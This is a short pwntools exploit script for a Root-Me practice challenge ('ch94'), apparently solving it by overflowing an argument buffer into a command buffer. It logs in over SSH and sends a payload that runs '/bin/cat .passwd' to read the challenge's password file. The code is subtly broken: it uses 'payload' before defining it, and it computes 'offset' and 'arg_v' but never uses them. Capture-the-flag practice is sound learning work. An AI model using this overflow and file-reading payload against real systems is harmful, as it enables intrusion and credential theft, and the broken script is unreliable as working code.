from pwn import *

#s = ssh(host='challenge03.root-me.org', user='app-systeme-ch94', password='app-systeme-ch94', port=2222)

s = ssh(host='challenge03.root-me.org',user='app-systeme-ch94',password='app-systeme-ch94',port=2223)

p = s.process('./ch94', payload)

cmd_addr = 0x0000559556383290
arg_addr = 0x0000559556383260
offset = cmd_addr - arg_addr
arg_v = b'\x00' 

payload = b'\x00' + b'A'*47 + b'/bin/cat .passwd\x00\n'

p.send(payload)

p.interactive()
